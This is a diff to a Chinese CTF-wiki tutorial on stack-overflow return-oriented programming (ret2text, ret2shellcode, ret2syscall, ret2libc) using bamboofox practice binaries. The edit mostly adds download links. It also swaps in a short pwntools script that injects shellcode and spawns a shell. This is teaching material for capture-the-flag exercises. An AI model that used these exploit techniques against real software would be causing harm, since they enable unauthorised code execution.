@@ -19,6 +19,8 @@ ret2text即需要我们控制程序执行程序本身已有的的代码(.text)�
 
 其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox中介绍ROP时使用的ret2text的例子。
 
+点击下载: [ret2text](https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2text/ret2text)
+
 首先，查看一下程序的保护机制
 
 ```shell
@@ -132,7 +134,11 @@ ret2shellcode需要我们控制程序执行shellcode代码。而所谓的shellco
 
 ### 例子
 
-这里我们以bamboofox中的ret2shellcode为例，首先检测程序开启的保护
+这里我们以bamboofox中的ret2shellcode为例  
+
+点击下载: [ret2shellcode](https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2shellcode/ret2shellcode)
+
+首先检测程序开启的保护
 
 ```shell
 ➜  ret2shellcode checksec ret2shellcode
@@ -221,9 +227,11 @@ Start      End        Offset     Perm Path
 ##!/usr/bin/env python
 from pwn import *
 
-sh = process('./ret2text')
-target = 0x804863a
-sh.sendline('A' * (0x6c + 4) + p32(target))
+sh = process('./ret2shellcode')
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
+
+sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
 sh.interactive()
 ```
 
@@ -239,7 +247,11 @@ ret2syscall需要我们控制程序执行系统调用，获取shell。
 
 ### 例子
 
-这里我们以bamboofox中的ret2syscall为例，首先检测程序开启的保护
+这里我们以bamboofox中的ret2syscall为例  
+
+点击下载: [ret2syscall](https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2syscall/rop)
+
+首先检测程序开启的保护
 
 ```shell
 ➜  ret2syscall checksec rop
@@ -398,7 +410,11 @@ ret2libc即控制函数的执行 libc中的函数，通常是返回至某个函�
 
 #### 例1
 
-这里我们以bamboofox中ret2libc1为例。首先，我们可以检查一下程序的安全保护
+这里我们以bamboofox中ret2libc1为例  
+
+点击下载: [ret2libc1](https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2libc1/ret2libc1)
+
+首先，我们可以检查一下程序的安全保护
 
 ```shell
 ➜  ret2libc1 checksec ret2libc1    
@@ -461,7 +477,11 @@ sh.interactive()
 
 #### 例2
 
-这里以bamboofox中的ret2libc2为例，该题目与例1基本一致，只不过不再出现/bin/sh字符串，所以此次需要我们自己来读取字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行system(""/bin/sh")。由于漏洞与上述一致，这里就不在多说，具体的exp如下
+这里以bamboofox中的ret2libc2为例  
+
+点击下载: [ret2libc2](https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2libc2/ret2libc2)
+
+该题目与例1基本一致，只不过不再出现/bin/sh字符串，所以此次需要我们自己来读取字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行system(""/bin/sh")。由于漏洞与上述一致，这里就不在多说，具体的exp如下
 
 ```python
 ##!/usr/bin/env python
@@ -484,7 +504,11 @@ sh.interactive()
 
 #### 例3
 
-这里以bamboofox中的ret2libc3为例，在例2的基础上，再次将system函数的地址去掉。此时，我们需要同时找到system函数地址与/bin/sh字符串的地址。首先，查看安全保护
+这里以bamboofox中的ret2libc3为例  
+
+点击下载: [ret2libc3](https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2libc3/ret2libc3)
+
+在例2的基础上，再次将system函数的地址去掉。此时，我们需要同时找到system函数地址与/bin/sh字符串的地址。首先，查看安全保护
 
 ```shell
 ➜  ret2libc3 checksec ret2libc3
